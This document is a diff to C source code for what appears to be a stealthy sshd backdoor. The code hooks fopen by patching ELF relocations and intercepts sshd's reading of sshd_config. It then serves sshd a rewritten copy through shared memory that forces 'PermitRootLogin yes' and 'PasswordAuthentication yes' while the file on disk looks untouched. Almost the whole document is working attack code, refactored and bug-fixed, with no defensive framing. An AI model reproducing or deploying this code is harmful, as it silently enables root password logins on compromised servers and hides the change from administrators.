@@ -22,10 +22,7 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
  *	and then unhook ourselves sneaky beaky like
  * TODO: sanity
  * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
- * TODO: ensure EXPLICIT's robustness -- already had to fix an edge case
- * TODO: PermitRootLogin without-password && PermitRootLogin forced-commands-only
  * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
-
  */
 FILE *my_fopen(char *filename, char *mode)
 {
@@ -44,8 +41,10 @@ FILE *my_fopen(char *filename, char *mode)
 	 */
 	char *PermitRootLogin = NULL;
 	char *PasswordAuthentication = NULL;
+	char *ref_PRL = malloc(128);
+	char *ref_PA = "PasswordAuthentication no\n";
 
-	unsigned long long BITMASK = MASK_64;	
+	uint64_t BITMASK = MASK_64;	
 
 	int ret = 42;
 	while (ret != -1) {
@@ -78,7 +77,8 @@ FILE *my_fopen(char *filename, char *mode)
 				/* PermitRootLogin [y-Y]es is not valid, but there is a valid PermitRootLogin string */
 				BITMASK |= PermitRootLogin_EXPLICIT;
 			}
-		
+
+			ref_PRL = strdup(PermitRootLogin);
 			PermitRootLogin = NULL;
 		}
 
@@ -91,11 +91,6 @@ FILE *my_fopen(char *filename, char *mode)
 				/* clear any previously set PasswordAuthentication flags -- it's possible for a sshd_config to have duplicates */
 				BITMASK &= ~ PasswordAuthentication_MASK;
 
-				/* we have a valid PasswordAuthentication string - not commented 
-				 *		if the string is set to yes then there is NOWORK to be done
-				 *		otherwise we will have to EXPLICITly redefine no
-				 */
-
 				char *setting = strstr(PasswordAuthentication, "Yes");	
 				if (setting == NULL)
 					setting = strstr(PasswordAuthentication, "yes");	
@@ -105,7 +100,7 @@ FILE *my_fopen(char *filename, char *mode)
 				} else {
 					BITMASK |= PasswordAuthentication_EXPLICIT;
 				}
-			
+
 				PasswordAuthentication = NULL;
 			}
 		}
@@ -127,12 +122,13 @@ FILE *my_fopen(char *filename, char *mode)
 	 *	 -- BITMASK is unset
 	 * then make sure to append the correct strings to the end of the duped sshd_config we are making
 	 */	
-	unsigned long long tmpmask = BITMASK & PermitRootLogin_MASK;
+	uint64_t tmpmask;
+
+	tmpmask = BITMASK & PermitRootLogin_MASK;
 		
 	if (tmpmask != PermitRootLogin_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
 		BITMASK |= PermitRootLogin_APPEND;
 
-	
 	tmpmask = BITMASK & PasswordAuthentication_MASK;
 
 	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
@@ -140,32 +136,31 @@ FILE *my_fopen(char *filename, char *mode)
 	
 
 
-	/* read the sshd_specified in the paramater filename into a FD we can read() from */
+	/* read() filename's contents into a buffer we can manipulate */
 
 	int buf_len = orig_sshd_config_size + 150; /* what's 150 bytes between friends? */
 	char *buf = malloc(buf_len);
 
 	int orig_fd = open(filename, O_RDONLY);
 
-	read(orig_fd, buf, buf_len);
-	close(orig_fd);
+	read(orig_fd, buf, orig_sshd_config_size);
+	buf[orig_sshd_config_size] = '\0';
 
-	/* we have the original sshd_config from filename in memory - buf */
+	close(orig_fd);
+	/* we now have the original sshd_config from filename in memory - buf */
 
 
 	char *PRL_Y = "PermitRootLogin yes\n";
 	char *PA_Y = "PasswordAuthentication yes\n ";
-
 	char *new = NULL;
-
 
 	/* _EXPLICITS */
 	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
-		_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, "PermitRootLogin no", &buf, &buf_len);	
+		_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, ref_PRL, &buf, &buf_len);	
 	}
 
 	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
-		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, "PasswordAuthentication no", &buf, &buf_len);
+		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, ref_PA, &buf, &buf_len);
 	}
 
 
@@ -178,8 +173,7 @@ FILE *my_fopen(char *filename, char *mode)
 		_APPEND_work(&new, &buf_len, filename, PA_Y);
 	}
 
-
-	/* this passes a valid FILE* back to sshd using SHM and the new sshd_config we just made
+	/* this returns a valid FILE* back to sshd using SHM and the new sshd_config we just made (new)
 	 * 	shm_unlink should ensure that when sshd fclose(fp) the shm will be deleted 
 	 */
 	int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
@@ -196,7 +190,8 @@ FILE *my_fopen(char *filename, char *mode)
 	shm_unlink("/7355608");
 
 	hook_rela(ref_fopen_Rela, ref_fopen, RELOC_ADDEND);
-	
+
+	free(ref_PRL);	
 	return fp;
 }
 
@@ -205,13 +200,13 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 	int buf_len = *_buf_len;
 	uint64_t bytes_from_start = 0;
 	
-	char *config_name_ptr;
 
-	/* dup buf into tok_buf to preserve our original sshd_config */
+	/* dup buf into tok_buf to preserve our original sshd_config -- *__buf is getting clobbered */
 	char *tok_buf = malloc(buf_len); /* FIXME: this will leak */
-	
 	memcpy(tok_buf, *__buf, buf_len);
 
+
+	char *config_name_ptr;
 	char *str = strtok(tok_buf, "\n");
 	while (str != NULL) {
 		if (strncmp(str, config_name, strlen(config_name)) == 0) {
@@ -248,13 +243,16 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 	/* 
 	 * if this doesn't make you love C, I don't know what would 
 	 *
+	 * dest - *__new after the string (redefine) we just appended
+	 * src  - everything in *__buf (original sshd_config) after the string we just replaced
+	 * num  - the amount of chars left in buf after the string we replaced
 	 */	
-	memcpy((char *) *__new + strlen(*__new), (char *) *__buf + bytes_from_start + strlen(old),
-					strlen((char *) *__buf + bytes_from_start));
+	memcpy((char *) *__new + strlen(*__new),
+				(char *) *__buf + bytes_from_start + strlen(old),
+				strlen((char *) *__buf + bytes_from_start));
 
-
-
-	//free(*__buf);
+	//free(tok_buf);
+	free(*__buf);
 	*__buf = *__new;
 	
 	return 0;
